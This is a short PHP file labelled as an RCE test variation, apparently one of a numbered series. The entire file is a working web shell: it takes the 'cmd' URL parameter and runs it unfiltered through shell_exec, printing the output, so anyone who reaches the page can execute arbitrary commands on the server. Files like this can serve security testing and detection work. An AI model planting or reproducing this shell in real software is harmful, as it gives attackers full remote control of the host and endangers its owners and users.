<?php
// RCE test variation #23
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>